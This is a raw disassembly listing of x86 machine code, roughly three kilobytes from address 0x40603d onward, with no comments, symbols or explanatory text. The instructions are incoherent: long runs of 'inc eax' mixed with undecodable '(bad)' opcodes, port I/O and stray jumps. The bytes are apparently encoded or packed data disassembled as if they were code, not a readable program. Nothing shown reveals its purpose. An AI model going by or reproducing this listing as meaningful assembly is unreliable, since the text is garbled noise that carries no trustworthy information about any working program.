  40603d:	push   eax
  40603e:	repnz inc ecx
  406040:	dec    esi
  406041:	sub    al,BYTE PTR [edi+0x23]
  406044:	pusha  
  406045:	inc    eax
  406046:	cmc    
  406047:	pusha  
  406048:	mov    WORD PTR [esi+0x40],es
  40604b:	leave  
  40604c:	cmp    al,BYTE PTR [eax+0x6e]
  40604f:	outs   dx,BYTE PTR ds:[esi]
  406050:	inc    eax
  406051:	inc    eax
  406052:	inc    eax
  406053:	inc    eax
  406054:	inc    eax
  406055:	inc    eax
  406056:	inc    eax
  406057:	inc    eax
  406058:	add    dl,cl
  40605a:	fmulp  st(5),st
  40605c:	push   ecx
  40605d:	ret    
  40605e:	inc    eax
  40605f:	inc    ebp
  406060:	outs   dx,DWORD PTR ds:[esi]
  406061:	test   al,0x78
  406063:	enter  0x44cb,0x40
  406067:	fwait
  406068:	and    BYTE PTR [esp+ebp*4+0x48],cl
  40606c:	mov    esp,0x7e4240a7
  406071:	inc    eax
  406072:	inc    eax
  406073:	inc    eax
  406074:	inc    eax
  406075:	inc    eax
  406076:	inc    eax
  406077:	and    eax,0x3e404040
  40607c:	xor    DWORD PTR ds:0xb340bc41,eax
  406082:	cli    
  406083:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406084:	dec    eax
  406085:	retf   
  406086:	mov    WORD PTR [ebx+0x40],fs
  406089:	inc    ecx
  40608a:	jge    0x406099
  40608c:	bound  eax,QWORD PTR [eax-0x2c]
  40608f:	inc    edx
  406090:	inc    eax
  406091:	push   eax
  406092:	popa   
  406093:	leave  
  406094:	fld    QWORD PTR [edx+0x63]
  406097:	inc    eax
  406098:	inc    eax
  406099:	inc    eax
  40609a:	inc    eax
  40609b:	inc    eax
  40609c:	inc    eax
  40609d:	inc    eax
  40609e:	inc    eax
  40609f:	inc    eax
  4060a0:	inc    eax
  4060a1:	fwait
  4060a2:	inc    eax
  4060a3:	xor    esp,DWORD PTR [esi+ebx*4]
  4060a6:	arpl   WORD PTR [esi+0x4140c4a6],ax
  4060ac:	xor    dl,BYTE PTR [ebx-0x2f]
  4060af:	dec    eax
  4060b0:	ror    BYTE PTR [edi+0x40],1
  4060b3:	cmp    ebp,DWORD PTR [eax]
  4060b5:	push   edx
  4060b6:	test   al,0x15
  4060b8:	bound  eax,QWORD PTR [eax+0x40]
  4060bb:	inc    edx
  4060bc:	and    al,0x4c
  4060be:	(bad)  
  4060c0:	inc    eax
  4060c1:	inc    eax
  4060c2:	inc    eax
  4060c3:	inc    eax
  4060c4:	inc    eax
  4060c5:	inc    eax
  4060c6:	rol    DWORD PTR [eax+0x40],0x69
  4060ca:	pop    esp
  4060cb:	inc    eax
  4060cc:	adc    BYTE PTR [edi],ch
  4060ce:	and    al,0x2a
  4060d0:	push   ecx
  4060d1:	in     al,dx
  4060d2:	cmp    DWORD PTR [eax+0x27],eax
  4060d5:	fs popf 
  4060d7:	fs xor al,0x7e
  4060da:	inc    esp
  4060db:	inc    eax
  4060dc:	mov    al,ss:0x4689a84c
  4060e2:	jns    0x406124
  4060e4:	inc    ecx
  4060e5:	aaa    
  4060e6:	test   al,0x40
  4060e8:	inc    eax
  4060e9:	add    BYTE PTR [eax+0x40],al
  4060ec:	inc    eax
  4060ed:	inc    eax
  4060ee:	inc    eax
  4060ef:	inc    eax
  4060f0:	(bad)  
  4060f1:	lds    ebp,FWORD PTR [ebp+0x30]
  4060f4:	inc    eax
  4060f5:	jb     0x406165
  4060f7:	adc    BYTE PTR [eax+0x4a],al
  4060fa:	imul   ebp,DWORD PTR [eax+eax*2],0x4048216e
  406101:	dec    esp
  406102:	xchg   edx,eax
  406103:	add    al,0x40
  406105:	dec    ecx
  406106:	add    al,BYTE PTR [edx+0x43]
  406109:	fsub   QWORD PTR [edx+eiz*2]
  40610c:	inc    eax
  40610d:	icebp  
  40610e:	mov    ds:0x4040105d,eax
  406113:	inc    eax
  406114:	inc    eax
  406115:	inc    eax
  406116:	inc    eax
  406117:	inc    eax
  406118:	inc    eax
  406119:	inc    eax
  40611a:	inc    eax
  40611b:	dec    edx
  40611c:	bound  ecx,QWORD PTR [edx]
  40611e:	inc    eax
  40611f:	adc    eax,0xd4c4ac9b
  406124:	pop    esp
  406125:	loopne 0x406167
  406127:	adc    DWORD PTR [esi+0x52],ecx
  40612a:	dec    edi
  40612b:	or     BYTE PTR [ebx+ecx*2+0x4ee30240],0x40
  406133:	jnp    0x406136
  406135:	hlt    
  406136:	inc    eax
  406137:	shl    DWORD PTR [esp+esi*1+0x44],cl
  40613b:	push   ecx
  40613c:	es inc eax
  40613e:	inc    eax
  40613f:	inc    eax
  406140:	inc    eax
  406141:	inc    eax
  406142:	inc    eax
  406143:	int3   
  406144:	jne    0x406186
  406146:	push   esi
  406147:	inc    eax
  406148:	inc    edx
  406149:	or     DWORD PTR [ecx+0x3e],ecx
  40614c:	(bad)  
  40614d:	in     eax,dx
  40614e:	test   al,0x40
  406150:	mov    ah,0x38
  406152:	and    esp,edi
  406154:	dec    edi
  406155:	pop    ecx
  406156:	inc    eax
  406157:	inc    eax
  406158:	outs   dx,BYTE PTR ds:[esi]
  406159:	add    DWORD PTR [ebp-0x6f],0x40f62c48
  406160:	inc    eax
  406161:	pop    DWORD PTR [eax+0x0]
  406164:	rol    DWORD PTR [eax+0x40],0x40
  406168:	inc    eax
  406169:	add    BYTE PTR [eax-0x1c],al
  40616c:	xor    eax,0x4067910d
  406171:	push   edx
  406172:	add    eax,0xbccbc97d
  406177:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406178:	inc    eax
  406179:	std    
  40617a:	push   0x48
  40617c:	enter  0x5145,0xe8
  406180:	inc    eax
  406181:	aaa    
  406182:	add    DWORD PTR [ebp+0x43],eax
  406185:	jg     0x406183
  406187:	arpl   WORD PTR [eax+0x40],ax
  40618a:	ins    BYTE PTR es:[edi],dx
  40618b:	inc    eax
  40618c:	inc    eax
  40618d:	inc    eax
  40618e:	inc    eax
  40618f:	inc    eax
  406190:	inc    eax
  406191:	inc    eax
  406192:	inc    eax
  406193:	inc    DWORD PTR [eax+0x2c]
  406196:	sub    eax,0x4041cec8
  40619b:	push   eax
  40619c:	or     DWORD PTR [ebx+eax*2],0x402af8cb
  4061a3:	outs   dx,DWORD PTR ds:[esi]
  4061a4:	push   edi
  4061a5:	arpl   WORD PTR [eax],si
  4061a7:	inc    eax
  4061a8:	inc    eax
  4061a9:	inc    eax
  4061aa:	inc    eax
  4061ab:	inc    eax
  4061ac:	inc    eax
  4061ad:	inc    eax
  4061ae:	inc    eax
  4061af:	inc    eax
  4061b0:	inc    eax
  4061b1:	push   edx
  4061b2:	outs   dx,BYTE PTR ds:[esi]
  4061b3:	pop    eax
  4061b4:	inc    eax
  4061b5:	inc    eax
  4061b6:	add    BYTE PTR [ecx+0x35ce3435],al
  4061bc:	inc    eax
  4061bd:	jp     0x4061ef
  4061bf:	in     al,0xcb
  4061c1:	inc    eax
  4061c2:	inc    eax
  4061c3:	inc    eax
  4061c4:	inc    eax
  4061c5:	inc    eax
  4061c6:	inc    eax
  4061c7:	inc    eax
  4061c8:	inc    eax
  4061c9:	add    BYTE PTR [ecx+0x494040ac],cl
  4061cf:	mov    esi,0x66c543d9
  4061d4:	dec    eax
  4061d5:	inc    eax
  4061d6:	adc    BYTE PTR [edx],bh
  4061d8:	adc    ch,bl
  4061da:	inc    edx
  4061db:	dec    edx
  4061dc:	cmp    DWORD PTR [eax+0x34],eax
  4061df:	add    DWORD PTR [eax+esi*1+0x49],0x4140c311
  4061e7:	inc    eax
  4061e8:	inc    eax
  4061e9:	inc    eax
  4061ea:	inc    eax
  4061eb:	inc    eax
  4061ec:	inc    eax
  4061ed:	and    eax,0x60404040
  4061f2:	cmc    
  4061f3:	(bad)  
  4061f4:	in     al,dx
  4061f5:	in     eax,dx
  4061f6:	dec    eax
  4061f7:	inc    eax
  4061f8:	lock add edx,0xd62cc4f
  4061ff:	inc    eax
  406200:	add    eax,0x98444ea5
  406205:	jne    0x4061d2
  406207:	inc    eax
  406208:	sub    BYTE PTR [ebx+0x4040404c],al
  40620e:	inc    eax
  40620f:	inc    eax
  406210:	inc    eax
  406211:	inc    eax
  406212:	inc    eax
  406213:	inc    eax
  406214:	inc    eax
  406215:	scas   eax,DWORD PTR es:[edi]
  406216:	dec    esi
  406217:	cmp    al,0x40
  406219:	inc    eax
  40621a:	inc    ecx
  40621b:	inc    eax
  40621c:	aad    0x67
  40621e:	and    BYTE PTR [edi+0x49],al
  406221:	inc    eax
  406222:	rol    BYTE PTR [eax],1
  406224:	outs   dx,BYTE PTR ds:[esi]
  406225:	sar    BYTE PTR [esp+edi*1+0x407a4019],1
  40622c:	inc    eax
  40622d:	inc    eax
  40622e:	inc    eax
  40622f:	inc    eax
  406230:	inc    eax
  406231:	rol    DWORD PTR [eax+0x40],0x24
  406235:	in     eax,0x4c
  406237:	or     eax,0x7d40400a
  40623c:	inc    edi
  40623d:	shl    DWORD PTR [ecx],0xc9
  406240:	cmp    BYTE PTR [edx+0x40],ah
  406243:	mov    ah,0x81
  406245:	nop
  406246:	pop    edi
  406247:	dec    esp
  406248:	push   edx
  406249:	add    eax,0xbf023740
  40624e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40624f:	or     eax,0x7d4087cb
  406254:	add    DWORD PTR [eax+eax*2],0x40400040
  40625b:	inc    eax
  40625c:	inc    eax
  40625d:	inc    eax
  40625e:	inc    eax
  40625f:	mov    ebx,ecx
  406261:	push   esp
  406262:	push   0x7a461240
  406267:	bound  ecx,QWORD PTR [edx]
  406269:	inc    ebp
  40626a:	push   ebx
  40626b:	inc    eax
  40626c:	and    al,BYTE PTR [eax+0x40]
  40626f:	inc    eax
  406270:	inc    eax
  406271:	inc    eax
  406272:	inc    eax
  406273:	inc    eax
  406274:	inc    eax
  406275:	inc    eax
  406276:	inc    eax
  406277:	adc    DWORD PTR [edx-0x35],0x4027e634
  40627e:	pop    eax
  40627f:	mov    bh,0x10
  406281:	inc    eax
  406282:	and    BYTE PTR [edi+0x62],0x40
  406286:	rol    BYTE PTR [ebx-0x14],1
  406289:	cmp    al,0xc5
  40628b:	iret   
  40628c:	aam    0x40
  40628e:	adc    eax,0x47b26201
  406293:	and    esp,DWORD PTR [ebx+0x40]
  406296:	inc    eax
  406297:	inc    eax
  406298:	inc    eax
  406299:	inc    eax
  40629a:	inc    eax
  40629b:	int3   
  40629c:	jne    0x4062de
  40629e:	inc    eax
  40629f:	xor    ah,BYTE PTR [ebp+edi*8-0x30]
  4062a3:	inc    ebp
  4062a4:	test   al,0xd2
  4062a6:	inc    eax
  4062a7:	int    0x81
  4062a9:	mov    ch,0xc5
  4062ab:	inc    eax
  4062ac:	add    cl,al
  4062ae:	inc    eax
  4062af:	inc    eax
  4062b0:	inc    eax
  4062b1:	inc    eax
  4062b2:	add    BYTE PTR [eax-0x18],al
  4062b5:	adc    ch,BYTE PTR [eax-0x57d5cec0]
  4062bb:	dec    edi
  4062bc:	dec    eax
  4062bd:	inc    ecx
  4062be:	inc    ebx
  4062bf:	inc    eax
  4062c0:	inc    ecx
  4062c1:	inc    eax
  4062c2:	inc    eax
  4062c3:	inc    eax
  4062c4:	inc    eax
  4062c5:	inc    eax
  4062c6:	inc    eax
  4062c7:	inc    eax
  4062c8:	inc    eax
  4062c9:	inc    DWORD PTR [eax+0x1]
  4062cc:	adc    al,BYTE PTR [eax+0x402afb7d]
  4062d2:	shl    DWORD PTR [ebx-0x58],1
  4062d5:	(bad)
  4062d8:	adc    BYTE PTR [eax+0x42],al
  4062db:	adc    BYTE PTR ds:0x5c62484c,0x40
  4062e2:	adc    DWORD PTR [eax+0x40],eax
  4062e5:	inc    eax
  4062e6:	inc    eax
  4062e7:	inc    eax
  4062e8:	inc    eax
  4062e9:	inc    eax
  4062ea:	inc    eax
  4062eb:	inc    eax
  4062ec:	inc    eax
  4062ed:	and    eax,0xb40d43cb
  4062f2:	inc    ebx
  4062f3:	inc    eax
  4062f4:	jl     0x406374
  4062f6:	inc    esp
  4062f7:	sub    ebx,ecx
  4062f9:	ins    DWORD PTR es:[edi],dx
  4062fa:	jns    0x40633c
  4062fc:	rol    DWORD PTR [ecx],1
  4062fe:	jnp    0x40633c
  406300:	dec    ecx
  406301:	in     eax,0xd4
  406303:	inc    eax
  406304:	inc    eax
  406305:	inc    eax
  406306:	inc    eax
  406307:	inc    eax
  406308:	inc    eax
  406309:	inc    eax
  40630a:	inc    eax
  40630b:	add    BYTE PTR [eax+0x62],al
  40630e:	inc    ecx
  40630f:	mov    al,0xb9
  406311:	stos   DWORD PTR es:[edi],eax
  406312:	jb     0x406326
  406314:	inc    eax
  406315:	mov    ch,0x83
  406317:	bound  ebp,QWORD PTR [ecx+0x40605cb8]
  40631d:	jle    0x406358
  40631f:	lds    ebp,FWORD PTR [eax+0x40827105]
  406325:	adc    eax,DWORD PTR [ecx+0x40404040]
  40632b:	inc    eax
  40632c:	inc    eax
  40632d:	and    eax,0xb5404040
  406332:	adc    cl,cl
  406334:	addr16 ret 
  406336:	inc    eax
  406337:	inc    esp
  406338:	mov    bh,0x25
  40633a:	test   al,0x48
  40633c:	rol    DWORD PTR [ecx+0x40],cl
  40633f:	icebp  
  406340:	inc    eax
  406341:	inc    eax
  406342:	inc    eax
  406343:	inc    eax
  406344:	inc    eax
  406345:	inc    eax
  406346:	inc    eax
  406347:	inc    eax
  406348:	inc    eax
  406349:	inc    eax
  40634a:	popa   
  40634b:	bound  eax,QWORD PTR [edx+0x46]
  40634e:	cld    
  40634f:	fld    DWORD PTR [eax+0x3f]
  406352:	add    edi,DWORD PTR [edi-0x1b9c8c71]
  406358:	inc    eax
  406359:	pop    edx
  40635a:	inc    eax
  40635b:	inc    eax
  40635c:	inc    eax
  40635d:	inc    eax
  40635e:	inc    eax
  40635f:	inc    eax
  406360:	rol    DWORD PTR [eax+0x40],0xcf
  406364:	fmul   QWORD PTR [eax+eiz*8]
  406367:	and    BYTE PTR [edx+0x40],0xb1
  40636b:	pop    es
  40636c:	test   DWORD PTR [edx+eax*2-0x58],esp
  406370:	stos   DWORD PTR es:[edi],eax
  406371:	inc    eax
  406372:	rol    bh,cl
  406374:	bound  eax,QWORD PTR [eax]
  406376:	xor    eax,0x31404fdd
  40637b:	sbb    DWORD PTR [eax],0xfd9e432a
  406381:	inc    eax
  406382:	pop    ds
  406383:	inc    esp
  406384:	inc    eax
  406385:	inc    eax
  406386:	add    BYTE PTR [eax+0x40],al
  406389:	inc    eax
  40638a:	inc    eax
  40638b:	inc    eax
  40638c:	inc    eax
  40638d:	dec    esp
  40638e:	inc    eax
  40638f:	scas   al,BYTE PTR es:[edi]
  406390:	(bad)  
  406391:	fadd   QWORD PTR [eax-0x4d]
  406394:	add    BYTE PTR [edx+0x24],ah
  406397:	fwait
  406398:	pop    es
  406399:	test   al,0x40
  40639b:	add    al,0x40
  40639d:	inc    eax
  40639e:	inc    eax
  40639f:	inc    eax
  4063a0:	inc    eax
  4063a1:	inc    eax
  4063a2:	inc    eax
  4063a3:	inc    eax
  4063a4:	inc    eax
  4063a5:	inc    eax
  4063a6:	xor    dh,bh
  4063a8:	rep stos DWORD PTR es:[edi],eax
  4063aa:	xor    al,0x11
  4063ac:	inc    eax
  4063ad:	repnz xor al,0x4e
  4063b0:	bound  eax,QWORD PTR [edx-0x4c]
  4063b3:	pop    esp
  4063b4:	inc    eax
  4063b5:	adc    al,0x84
  4063b7:	dec    edi
  4063b8:	add    eax,0x40417334
  4063bd:	push   ebx
  4063be:	das    
  4063bf:	xchg   esi,eax
  4063c0:	xchg   DWORD PTR [eax+0x3740472b],ecx
  4063c6:	gs inc eax
  4063c8:	inc    eax
  4063c9:	inc    eax
  4063ca:	inc    eax
  4063cb:	inc    eax
  4063cc:	inc    eax
  4063cd:	int3   
  4063ce:	jne    0x406410
  4063d0:	push   ebx
  4063d1:	mov    dl,0x7b
  4063d3:	bound  edx,QWORD PTR [eax+eax*2-0x29cbffbe]
  4063da:	inc    edx
  4063db:	dec    eax
  4063dc:	add    BYTE PTR [eax+0x71],0xb5
  4063e0:	mov    WORD PTR [esi-0x2],fs
  4063e3:	or     eax,0x602140c3
  4063e8:	bound  eax,QWORD PTR [eax+0x0]
  4063eb:	rol    DWORD PTR [eax+0x40],0x40
  4063ef:	inc    eax
  4063f0:	add    BYTE PTR [eax+0x12],al
  4063f3:	inc    ebp
  4063f4:	ins    DWORD PTR es:[edi],dx
  4063f5:	mov    esp,0x4437b340
  4063fa:	pop    esp
  4063fb:	sbb    bh,BYTE PTR [esi]
  4063fd:	cmc    
  4063fe:	inc    eax
  4063ff:	mov    bh,0x2
  406401:	aam    0x62
  406403:	sub    BYTE PTR [edi],dl
  406405:	das    
  406406:	inc    eax
  406407:	jnp    0x406437
  406409:	push   0x5
  40640b:	lds    edx,FWORD PTR [esi]
  40640d:	inc    ebx
  40640e:	inc    eax
  40640f:	mov    cl,0x40
  406411:	inc    eax
  406412:	inc    eax
  406413:	inc    eax
  406414:	inc    eax
  406415:	inc    eax
  406416:	inc    eax
  406417:	inc    eax
  406418:	inc    DWORD PTR [eax+0x25]
  40641b:	mov    esi,0xf8b5d487
  406420:	inc    eax
  406421:	push   es
  406422:	add    dh,BYTE PTR [ecx+0x3465cb40]
  406428:	inc    eax
  406429:	jno    0x40645d
  40642b:	add    bl,BYTE PTR [edx]
  40642d:	push   edx
  40642e:	adc    al,0x40
  406430:	inc    eax
  406431:	pop    ebp
  406432:	push   ebx
  406433:	arpl   WORD PTR [edi+0x34],sp
  406436:	imul   edi,DWORD PTR [ecx],0x40404040
  40643c:	inc    eax
  40643d:	inc    eax
  40643e:	inc    eax
  40643f:	inc    eax
  406440:	inc    eax
  406441:	inc    eax
  406442:	inc    eax
  406443:	sti    
  406444:	cmp    DWORD PTR [eax+0x6e4c9262],0x5c86640
  40644e:	mov    ch,al
  406450:	jle    0x4064b6
  406452:	inc    eax
  406453:	xchg   edi,eax
  406454:	or     ecx,ecx
  406456:	inc    eax
  406457:	inc    eax
  406458:	inc    eax
  406459:	inc    eax
  40645a:	inc    eax
  40645b:	inc    eax
  40645c:	inc    eax
  40645d:	inc    eax
  40645e:	add    BYTE PTR [eax+0x51],al
  406461:	jge    0x4064a6
  406463:	inc    eax
  406464:	add    eax,0xfe65b8f5
  406469:	(bad)  
  40646a:	fld    DWORD PTR [eax-0x4f]
  40646d:	add    DWORD PTR ds:0xdb934f4b,eax
  406473:	inc    eax
  406474:	inc    esp
  406475:	pop    ss
  406476:	inc    ebx
  406477:	enter  0x40bc,0x40
  40647b:	inc    eax
  40647c:	inc    eax
  40647d:	inc    eax
  40647e:	inc    eax
  40647f:	and    eax,0x3c404040
  406484:	inc    ebx
  406485:	inc    eax
  406486:	push   ecx
  406487:	push   cs
  406488:	dec    eax
  406489:	das    
  40648a:	or     eax,0x5a40996a
  40648f:	add    DWORD PTR [esp+eax*8+0x40d33dcb],0x4fc32f51
  40649a:	dec    eax
  40649b:	cld    
  40649c:	inc    eax
  40649d:	inc    eax
  40649e:	push   edi
  40649f:	inc    eax
  4064a0:	inc    eax
  4064a1:	inc    eax
  4064a2:	inc    eax
  4064a3:	inc    eax
  4064a4:	inc    eax
  4064a5:	inc    eax
  4064a6:	inc    eax
  4064a7:	inc    eax
  4064a8:	inc    eax
  4064a9:	add    eax,DWORD PTR [esi-0x41]
  4064ac:	cmp    eax,DWORD PTR [eax+0x39]
  4064af:	inc    eax
  4064b0:	shl    DWORD PTR [esi-0x53],1
  4064b3:	test   al,0xbc
  4064b5:	mov    eax,0x1bf406e
  4064ba:	sub    al,0x3d
  4064bc:	retf   
  4064bd:	jno    0x4064ff
  4064bf:	inc    eax
  4064c0:	inc    eax
  4064c1:	inc    eax
  4064c2:	inc    eax
  4064c3:	inc    eax
  4064c4:	rol    DWORD PTR [eax+0x40],0x60
  4064c8:	inc    eax
  4064c9:	cmp    eax,0x49c3a86f
  4064ce:	loope  0x406513
  4064d0:	inc    eax
  4064d1:	xchg   ecx,eax
  4064d2:	add    dl,BYTE PTR [eax]
  4064d4:	test   al,0xc0
  4064d6:	leave  
  4064d7:	fld    DWORD PTR [eax+0x41]
  4064da:	xor    BYTE PTR [ebp+eax*1+0x40facd36],ch
  4064e1:	inc    eax
  4064e2:	add    BYTE PTR [eax+0x40],al
  4064e5:	inc    eax
  4064e6:	inc    eax
  4064e7:	inc    eax
  4064e8:	inc    eax
  4064e9:	inc    eax
  4064ea:	sar    DWORD PTR [edx+ebp*1],cl
  4064ed:	leave  
  4064ee:	dec    esp
  4064ef:	shr    BYTE PTR [eax-0x44fe9dc0],1
  4064f5:	xchg   ecx,eax
  4064f6:	adc    eax,0x3340450c
  4064fb:	adc    eax,0x63cb4864
  406500:	mov    BYTE PTR [eax+0x14],0x40
  406504:	inc    eax
  406505:	inc    eax
  406506:	inc    eax
  406507:	inc    eax
  406508:	inc    eax
  406509:	inc    eax
  40650a:	inc    eax
  40650b:	inc    eax
  40650c:	inc    eax
  40650d:	or     BYTE PTR [esi+0x29],dl
  406510:	jnp    0x406553
  406512:	mov    esp,0x3523b540
  406517:	aam    0x41
  406519:	xor    edx,0x80b60040
  40651f:	enter  0xc3c1,0xa8
  406523:	inc    eax
  406524:	cmc    
  406525:	pextrw eax,(bad),0xc5
  406527:	inc    ebx
  406528:	loopne 0x406571
  40652a:	inc    eax
  40652b:	inc    eax
  40652c:	inc    edx
  40652d:	inc    eax
  40652e:	inc    eax
  40652f:	inc    eax
  406530:	inc    eax
  406531:	inc    eax
  406532:	inc    eax
  406533:	int3   
  406534:	jne    0x406576
  406536:	add    BYTE PTR [ecx+0x3d],al
  406539:	dec    eax
  40653a:	lahf   
  40653b:	out    dx,eax
  40653c:	inc    eax
  40653d:	shl    BYTE PTR [edx],1
  40653f:	dec    eax
  406540:	rol    BYTE PTR ds:0x2140675e,0x6a
  406547:	enter  0xcba8,0x47
  40654b:	add    DWORD PTR [eax+0x4f],0x40109f01
  406552:	add    cl,al
  406554:	inc    eax
  406555:	inc    eax
  406556:	inc    eax
  406557:	inc    eax
  406558:	add    BYTE PTR [eax+0x48],al
  40655b:	ffree  st(3)
  40655d:	inc    eax
  40655e:	popf   
  40655f:	sbb    ah,BYTE PTR [eax+ecx*2+0x40c96441]
  406566:	mov    ebp,0x3e411181
  40656b:	inc    eax
  40656c:	ss inc eax
  40656e:	dec    edi
  40656f:	inc    esp
  406570:	ror    BYTE PTR [ebp-0x2c],cl
  406573:	mov    ebp,0x9f405c
  406578:	jb     0x406522
  40657a:	inc    eax
  40657b:	inc    eax
  40657c:	inc    eax
  40657d:	inc    eax
  40657e:	inc    eax
  40657f:	inc    eax
  406580:	inc    eax
  406581:	inc    eax
  406582:	inc    DWORD PTR [eax+0x48]
  406585:	push   0xffffffa1
  406587:	inc    eax
  406588:	jge    0x4065ad
  40658a:	dec    edi
  40658b:	imul   ebp,DWORD PTR [edx],0xffffff8b
  40658e:	mov    cl,0x40
  406590:	mov    bl,0xf2
  406592:	inc    eax
  406593:	inc    eax
  406594:	inc    eax
  406595:	inc    eax
  406596:	inc    eax
  406597:	inc    eax
  406598:	inc    eax
  406599:	inc    eax
  40659a:	inc    eax
  40659b:	inc    eax
  40659c:	cmc    
  40659d:	pop    edx
  40659e:	sub    DWORD PTR [edx+eiz*2],edi
  4065a1:	inc    eax
  4065a2:	lds    ecx,FWORD PTR [edi+0x55482c6b]
  4065a8:	dec    edx
  4065a9:	inc    eax
  4065aa:	push   ebp
  4065ab:	inc    ecx
  4065ac:	mov    esp,0x99900d92
  4065b1:	inc    eax
  4065b2:	pop    edi
  4065b3:	and    BYTE PTR [edx-0x41],0xc9
  4065b7:	push   0xfb9240a8
  4065bc:	test   al,0x82
  4065be:	dec    eax
  4065bf:	icebp  
  4065c0:	inc    eax
  4065c1:	inc    eax
  4065c2:	and    eax,DWORD PTR [eax+0x40]
  4065c5:	inc    eax
  4065c6:	inc    eax
  4065c7:	inc    eax
  4065c8:	inc    eax
  4065c9:	inc    eax
  4065ca:	inc    eax
  4065cb:	add    BYTE PTR ds:0x3841fa10,ch
  4065d1:	inc    ecx
  4065d2:	inc    eax
  4065d3:	ret    
  4065d4:	bt     DWORD PTR [edx+0x58],0x75
  4065d9:	mov    BYTE PTR [eax-0xa],0x84
  4065dd:	adc    dl,al
  4065df:	rcl    al,1
  4065e1:	ins    BYTE PTR es:[edi],dx
  4065e2:	inc    eax
  4065e3:	sub    al,0x6
  4065e5:	bound  eax,QWORD PTR [edx+0x35]
  4065e8:	mov    al,ds:0x40404062
  4065ed:	inc    eax
  4065ee:	inc    eax
  4065ef:	inc    eax
  4065f0:	and    eax,0x40404040
  4065f5:	sbb    eax,0x30356c3b
  4065fa:	test   al,0x5
  4065fc:	inc    eax
  4065fd:	push   ebx
  4065fe:	nop
  4065ff:	and    al,0x39
  406602:	adc    DWORD PTR [edi-0x3c9d4ac0],eax
  406608:	bound  esi,QWORD PTR [ecx+0x48]
  40660b:	cmp    al,0x40
  40660d:	push   edi
  40660e:	dec    eax
  40660f:	mov    esp,0x98418875
  406614:	inc    eax
  406615:	xchg   ebp,eax
  406616:	xchg   BYTE PTR [ecx+0x63],al
  406619:	jae    0x40665b
  40661b:	inc    eax
  40661c:	inc    eax
  40661d:	inc    eax
  40661e:	inc    eax
  40661f:	inc    eax
  406620:	inc    eax
  406621:	inc    eax
  406622:	inc    eax
  406623:	inc    eax
  406624:	push   DWORD PTR [edi]
  406626:	inc    eax
  406627:	pop    ebx
  406628:	jp     0x4065fd
  40662a:	pusha  
  40662b:	pushf  
  40662c:	sub    BYTE PTR [edx+0x78799340],bh
  406632:	inc    eax
  406633:	inc    eax
  406634:	inc    eax
  406635:	inc    eax
  406636:	inc    eax
  406637:	inc    eax
  406638:	rol    DWORD PTR [eax+0x40],0x2a
  40663c:	dec    eax
  40663d:	cmp    BYTE PTR gs:[eax+0x6b],al
  406641:	add    ah,BYTE PTR [edx-0x20]
  406644:	push   ecx
  406645:	inc    edx
  406646:	mov    ebx,0x4040f540
  40664b:	add    BYTE PTR [eax+0x40],al
  40664e:	inc    eax
  40664f:	inc    eax
  406650:	inc    eax
  406651:	inc    eax
  406652:	adc    eax,0x49dd050d
  406657:	ins    BYTE PTR es:[edi],dx
  406658:	inc    eax
  406659:	inc    edx
  40665a:	and    al,0x28
  40665c:	leave  
  40665d:	inc    edx
  40665e:	adc    al,0xa8
  406660:	inc    eax
  406661:	inc    eax
  406662:	inc    eax
  406663:	inc    eax
  406664:	inc    eax
  406665:	inc    eax
  406666:	inc    eax
  406667:	inc    eax
  406668:	inc    eax
  406669:	inc    eax
  40666a:	inc    eax
  40666b:	rol    ebx,cl
  40666d:	push   ecx
  40666e:	nop
  40666f:	adc    ch,cl
  406671:	inc    ecx
  406672:	inc    eax
  406673:	inc    ebx
  406674:	and    BYTE PTR [esi+0x43],0x6a
  406678:	push   eax
  406679:	sub    al,BYTE PTR [eax+0x71]
  40667c:	inc    eax
  40667d:	inc    eax
  40667e:	inc    eax
  40667f:	inc    eax
  406680:	inc    eax
  406681:	inc    eax
  406682:	int3   
  406683:	jne    0x4066c5
  406685:	ins    DWORD PTR es:[edi],dx
  406686:	adc    al,0x51
  406688:	sbb    eax,0x4040120d
  40668d:	add    BYTE PTR ds:0x5ccb2c38,dh
  406693:	inc    eax
  406694:	adc    al,BYTE PTR [edx+0x10bcfc80]
  40669a:	add    BYTE PTR [eax+0x9],0x24
  40669e:	lds    esp,FWORD PTR [ebx+0x40]
  4066a1:	add    cl,al
  4066a3:	inc    eax
  4066a4:	inc    eax
  4066a5:	inc    eax
  4066a6:	inc    eax
  4066a7:	add    BYTE PTR [eax+0x5],al
  4066aa:	push   esp
  4066ab:	ret    
  4066ac:	inc    eax
  4066ad:	inc    esp
  4066ae:	dec    esi
  4066af:	inc    ecx
  4066b0:	sub    ebx,ecx
  4066b2:	add    eax,0x2d04046
  4066b7:	sbb    DWORD PTR [edx+0x50],eax
  4066ba:	retf   
  4066bb:	imul   eax,DWORD PTR [eax-0x43],0x15f6c422
  4066c2:	pop    edi
  4066c3:	sub    BYTE PTR [eax+0xf],al
  4066c6:	inc    edi
  4066c7:	bound  eax,QWORD PTR fs:[edx+0x40]
  4066cb:	inc    eax
  4066cc:	inc    eax
  4066cd:	inc    eax
  4066ce:	inc    eax
  4066cf:	inc    eax
  4066d0:	inc    eax
  4066d1:	inc    eax
  4066d2:	inc    DWORD PTR [eax+0x49]
  4066d5:	pusha  
  4066d6:	inc    eax
  4066d7:	inc    edx
  4066d8:	xor    dh,0x66
  4066db:	push   edx
  4066dc:	in     eax,dx
  4066dd:	pop    esp
  4066de:	inc    eax
  4066df:	rcl    BYTE PTR ds:0x48906353,1
  4066e5:	xor    DWORD PTR [eax+0x42],eax
  4066e8:	inc    eax
  4066e9:	inc    eax
  4066ea:	inc    eax
  4066eb:	inc    eax
  4066ec:	inc    eax
  4066ed:	inc    eax
  4066ee:	inc    eax
  4066ef:	inc    eax
  4066f0:	inc    eax
  4066f1:	inc    eax
  4066f2:	cmp    BYTE PTR [ecx],ah
  4066f4:	dec    edx
  4066f5:	dec    eax
  4066f6:	arpl   WORD PTR [ebp+0x40],bp
  4066f9:	ffreep st(4)
  4066fb:	ret    
  4066fc:	pusha  
  4066fd:	leave  
  4066fe:	gs inc eax
  406700:	inc    eax
  406701:	inc    eax
  406702:	inc    eax
  406703:	inc    eax
  406704:	inc    eax
  406705:	inc    eax
  406706:	inc    eax
  406707:	add    BYTE PTR [eax],ah
  406709:	inc    eax
  40670a:	jae    0x40670c
  40670c:	mov    esp,0xda34b853
  406711:	inc    eax
  406712:	inc    edx
  406713:	jae    0x4066b3
  406715:	or     BYTE PTR [edi],al
